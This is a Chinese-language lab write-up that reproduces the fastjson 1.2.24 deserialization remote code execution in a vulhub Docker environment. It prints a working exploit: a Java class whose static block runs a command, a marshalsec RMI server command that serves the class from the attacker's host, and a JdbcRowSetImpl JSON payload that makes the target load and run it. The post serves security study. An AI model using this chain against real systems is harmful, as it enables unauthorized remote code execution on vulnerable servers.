JSON，全称：JavaScript Object
Notation，作为一个常见的轻量级的数据交换格式，应该在一个程序员的开发生涯中是常接触的。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。
易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。

漏洞影响范围:fastjson<=1.2.24

本文仅作漏洞复现记录与实现，利用流程如下:

## 一、漏洞环境搭建

本文漏洞环境采用vulhub搭建，执行以下命令开启环境

cd /vulhub/fastjson/1.2.24-rce/

docker-compose up -d

执行完毕后访问8090端口，访问如下:

![1620220431_60929a0f462bc93bc122a.png!small](https://image.3001.net/images/20210505/1620220431_60929a0f462bc93bc122a.png!small)

漏洞链接:http://192.168.101.152:8090/

攻击机IP:192.168.101.131

## 二、漏洞复现

首先将exp进行编译，将以下内容保存为TouchFile.java

    
    
    import java.lang.Runtime;
    import java.lang.Process;
    
    public class TouchFile {
      static {
          try {
              Runtime rt = Runtime.getRuntime();
              String[] commands = {"ping", "test.3ztjrz.dnslog.cn"};
              Process pc = rt.exec(commands);
              pc.waitFor();
          } catch (Exception e) {
              // do nothing
          }
      }
    }

![1620220455_60929a27b703b99126bac.png!small](https://image.3001.net/images/20210505/1620220455_60929a27b703b99126bac.png!small)

之后使用javac编译为class文件，最好是用低版本的java编译，高版本可能利用不了，这里使用的是1.8版本

![1620220553_60929a894e41c0007f50b.png!small](https://image.3001.net/images/20210505/1620220553_60929a894e41c0007f50b.png!small)

编译完成后会得到一个TouchFile.class文件，然后在同目录下用python开启http服务，执行以下命令

python -m http.server 8000

![1620220641_60929ae1d45a5a039dc58.png!small](https://image.3001.net/images/20210505/1620220641_60929ae1d45a5a039dc58.png!small)

然后借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class，执行以下命令

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer
"http://192.168.101.131:8000/#TouchFile" 9999

![1620220727_60929b376f0a09a460adb.png!small](https://image.3001.net/images/20210505/1620220727_60929b376f0a09a460adb.png!small)

之后使用burp发送特定poc数据包

    
    
    POST / HTTP/1.1
    Host: 192.168.101.152:8090
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    
    
    
    {
      "b":{
          "@type":"com.sun.rowset.JdbcRowSetImpl",
          "dataSourceName":"rmi://192.168.101.131:9999/TouchFile",
          "autoCommit":true
      }
    }

![1620220798_60929b7e26ffb41d2ad3f.png!small](https://image.3001.net/images/20210505/1620220798_60929b7e26ffb41d2ad3f.png!small)

  

稍等一下可以可以看到访问152机子的请求

![1620221208_60929d18efcf4ec07563c.png!small](https://image.3001.net/images/20210505/1620221208_60929d18efcf4ec07563c.png!small)

![1620221233_60929d31bc54b27c6638b.png!small](https://image.3001.net/images/20210505/1620221233_60929d31bc54b27c6638b.png!small)

过一会儿就可以看到dnslog收到了请求

![1620221241_60929d39d0e4b3fdcd6d2.png!small](https://image.3001.net/images/20210505/1620221241_60929d39d0e4b3fdcd6d2.png!small)

命令执行成功

